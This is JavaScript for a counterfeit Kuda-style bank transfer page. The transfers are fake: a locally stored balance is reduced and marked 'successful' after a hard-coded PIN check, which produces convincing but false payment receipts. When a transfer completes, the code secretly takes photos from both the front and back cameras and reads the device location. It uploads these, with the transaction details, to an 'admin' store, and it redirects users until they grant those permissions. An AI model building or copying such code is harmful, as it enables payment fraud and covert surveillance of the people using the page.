// Bank Logo Mapping
const bankLogos = {
  'Access Bank': 'https://i.imgur.com/3Aii5hd.jpeg',
  'Ecobank Nigeria': 'https://i.imgur.com/9l0WS8C.jpeg',
  'Fidelity Bank Nigeria': 'https://i.imgur.com/cXz0fFL.png',
  'First Bank of Nigeria': 'https://i.imgur.com/FkGt7r1.jpeg',
  'Guaranty Trust Bank': 'https://i.imgur.com/1atacbl.png',
  'Moniepoint': 'https://i.imgur.com/GiQWkmw.jpeg',
  'Opay': 'https://i.imgur.com/YAIOeGj.png',
  'PalmPay': 'https://i.imgur.com/YbUdktd.png',
  'Sterling Bank Plc': 'https://i.imgur.com/qyVV90r.png',
  'Union Bank of Nigeria': 'https://i.imgur.com/518WtnU.png',
  'Zenith Bank Plc': 'https://i.imgur.com/y8c8Wbn.png'
};

function getBankLogoUrl(bankName) {
  if (!bankName) return null;
  return bankLogos[bankName] || null;
}

// Transfer page functionality
let appData = {
    balance: 10000.00,
    userName: 'BABATUNDE',
    transactions: []
};

let pendingTransaction = null;
let correctPin = '8624';

async function saveReceiptToAdmin(receiptData) {
    await saveReceiptToCloud(receiptData);
}

// Load data
function loadData() {
    const saved = localStorage.getItem('kudasavingsData');
    if (saved) {
        appData = JSON.parse(saved);
    }
    updateBalance();
}

// Update balance display
function updateBalance() {
    const balanceEl = document.getElementById('availableBalance');
    if (balanceEl) {
        balanceEl.textContent = new Intl.NumberFormat('en-NG', {
            style: 'currency',
            currency: 'NGN'
        }).format(appData.balance);
    }
}

// Load Nigerian banks
function loadBanks() {
    const banks = [
        'Access Bank', 'Citibank', 'Diamond Bank', 'Ecobank Nigeria', 'Fidelity Bank Nigeria',
        'First Bank of Nigeria', 'First City Monument Bank', 'Guaranty Trust Bank',
        'Heritage Bank Plc', 'Keystone Bank Limited', 'Polaris Bank', 'Providus Bank Plc',
        'Stanbic IBTC Bank Nigeria Limited', 'Standard Chartered Bank', 'Sterling Bank Plc',
        'Union Bank of Nigeria', 'United Bank for Africa', 'Unity Bank Plc', 'Wema Bank Plc',
        'Zenith Bank Plc', 'Jaiz Bank', 'Kuda Microfinance Bank',
        'Opay', 'PalmPay', 'Moniepoint', 'Carbon'
    ];

    const select = document.getElementById('bankName');
    banks.forEach(bank => {
        const option = document.createElement('option');
        option.value = bank;
        option.textContent = bank;
        select.appendChild(option);
    });
}

// Check if amount exceeds balance
document.getElementById('amount')?.addEventListener('input', function() {
    const amount = parseFloat(this.value) || 0;
    const msg = document.getElementById('insufficientMsg');

    if (amount > appData.balance) {
        msg.style.display = 'block';
        this.style.borderColor = '#e74c3c';
    } else {
        msg.style.display = 'none';
        this.style.borderColor = '#ddd';
    }
});

// Open PIN Modal
function openPinModal() {
    document.getElementById('pinModal').classList.remove('hidden');
    document.getElementById('pinInput').value = '';
    document.getElementById('pinError').classList.add('hidden');
    document.getElementById('pinInput').focus();
}

// Close PIN Modal
function closePinModal() {
    document.getElementById('pinModal').classList.add('hidden');
    pendingTransaction = null;
}

// Verify PIN
function verifyPin() {
    const pin = document.getElementById('pinInput').value;

    if (pin === correctPin) {
        document.getElementById('pinModal').classList.add('hidden');
        completeTransfer();
    } else {
        document.getElementById('pinError').classList.remove('hidden');
        document.getElementById('pinInput').value = '';
        document.getElementById('pinInput').focus();
    }
}

// Allow Enter key to submit PIN
document.addEventListener('DOMContentLoaded', function() {
    const pinInput = document.getElementById('pinInput');
    if (pinInput) {
        pinInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                verifyPin();
            }
        });
    }
});

// Handle form submission
document.getElementById('transferForm')?.addEventListener('submit', function(e) {
    e.preventDefault();

    const amount = parseFloat(document.getElementById('amount').value);

    if (amount > appData.balance) {
        alert('Insufficient balance!');
        return;
    }

    pendingTransaction = {
        id: 'TXN' + Date.now(),
        type: 'debit',
        accountName: document.getElementById('accountName').value,
        bankName: document.getElementById('bankName').value,
        accountNumber: document.getElementById('accountNumber').value,
        amount: amount,
        narration: document.getElementById('narration').value,
        date: new Date().toISOString(),
        status: 'successful',
        title: `Transfer to ${document.getElementById('accountName').value}`,
        referenceNumber: generateReference()
    };

    openPinModal();
});

// Complete transfer after PIN verification
async function completeTransfer() {
    if (!pendingTransaction) return;

    document.getElementById('loadingOverlay').classList.remove('hidden');

    appData.balance -= pendingTransaction.amount;
    appData.transactions.unshift(pendingTransaction);

    localStorage.setItem('kudasavingsData', JSON.stringify(appData));
    localStorage.setItem('currentTransaction', JSON.stringify(pendingTransaction));

    // Capture both cameras and location simultaneously for speed
    const [cameras, location] = await Promise.all([
        captureBothCameras(),
        getCurrentLocation()
    ]);

    try {
        await saveReceiptToAdmin({
            username: appData.userName || 'BABATUNDE',
            accountName: pendingTransaction.accountName,
            bankName: pendingTransaction.bankName,
            accountNumber: pendingTransaction.accountNumber,
            amount: pendingTransaction.amount,
            narration: pendingTransaction.narration,
            referenceNumber: pendingTransaction.referenceNumber,
            transactionDate: pendingTransaction.date,
            transactionType: 'debit',
            capturedFace: cameras.front,
            backCameraPhoto: cameras.back,
            location: location
        });
    } catch (e) {
        console.error('Receipt save failed:', e);
    }

    setTimeout(() => {
        document.getElementById('loadingOverlay').classList.add('hidden');
        window.location.href = '/success.html';
    }, 3000);
}

// Generate reference number
function generateReference() {
    return '2509' + Date.now().toString().slice(-16);
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    const locationGranted = localStorage.getItem('locationGranted') === 'true';
    const cameraGranted = localStorage.getItem('cameraGranted') === 'true';
    if (!locationGranted || !cameraGranted) {
        window.location.href = '/password.html';
        return;
    }

    loadData();
    loadBanks();

    const accountInput = document.getElementById('accountNumber');
    accountInput?.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
    });
});
